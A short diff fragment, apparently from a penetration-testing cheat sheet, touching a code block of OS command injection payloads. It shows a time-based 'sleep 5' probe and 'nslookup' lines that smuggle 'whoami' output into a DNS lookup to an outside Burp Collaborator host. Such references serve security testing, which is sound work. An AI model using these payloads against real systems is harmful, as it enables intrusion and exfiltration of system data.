@@ -29,5 +29,6 @@ asd||sleep 5 # >> Last parameter or to comment out extra parameter
 & nslookup xgvse45vdusd5etw7ewqd9d78wq.burpcollaborator.net #
 
 & nslookup `whoami`.xgvse45vdusd5etw7ewqd9d78wq.burpcollaborator.net #
+
 & nslookup $(whoami).xgvse45vdusd5etw7ewqd9d78wq.burpcollaborator.net #
 ```
